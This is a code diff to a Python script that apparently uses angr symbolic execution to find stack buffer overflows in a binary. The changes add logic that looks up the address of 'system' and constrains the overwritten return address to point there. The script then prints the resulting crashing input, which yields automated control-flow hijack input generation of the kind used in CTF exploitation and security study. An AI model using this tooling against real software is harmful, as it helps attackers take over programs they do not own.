@@ -14,6 +14,7 @@ len_unconstrained_input = -1
 simgr = proj.factory.simulation_manager(state,save_unconstrained=True)
 simgr.stashes['bof'] = []
 crashing_input = ""
+win_addr = 0
 
 def findmitigation():
 	# reference: https://github.com/ChrisTheCoolHut/Zeratool/blob/master/lib/protectionDetector.py
@@ -41,20 +42,32 @@ def findfunctions():
 	for fninfo in id_.func_info:
 		print(hex(fninfo.addr), fninfo.name)
 		function[fninfo.name] = fninfo.addr
+	find_win()
 
+def find_win():
+	global win_addr
+	if ("system" in function):
+		win_addr = function["system"]
+	
 def find_bof(simgr):
 	global crashing_input
+	global win_addr
 	# working of simgr and stashes: https://github.com/angr/angr-doc/blob/master/docs/pathgroups.md
 	if len(simgr.unconstrained):
 	# finding unconstrained path to overwrite the return address with "CCCC"*2
 		for path in simgr.unconstrained:
-			#if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCC"*2]):
-			path.add_constraints(path.regs.pc == b"CCCC"*2)
+			#if path.satisfiable(extra_constraints=[path.regs.pc == b"CCCC"*2]): 
+			addr = p64(win_addr)
+			if(not addr):
+				addr = b"CCCC"*2
+			print(addr)
+			path.add_constraints(path.regs.pc == addr)
 			if path.satisfiable():
+				# input_data = state.posix.stdin.load(0, state.posix.stdin.size) <-- to create a bitvector of the input size
 				simgr.stashes['bof'].append(path)
 				unconstrained_state = path
 				crashing_input = unconstrained_state.posix.dumps(0)
-					
+				print(len(crashing_input))
 			simgr.stashes['unconstrained'].remove(path)
 			simgr.drop(stash='active')
 	return simgr	
@@ -70,7 +83,7 @@ def prog_state(state):
 		if(simgr.stashes['bof'] != []):
 			print("[+] overflow detected")
 			print("[+] len of crashing input {}".format(len(crashing_input)))
-
+			print(crashing_input)
 			if(binary.canary == False):
 				print("[+] no canary detected")
 			else:
@@ -79,8 +92,8 @@ def prog_state(state):
 			print("[+] no overflow detected")
 
 
-		
 findfunctions()
+	
 prog_state(state)
 
 
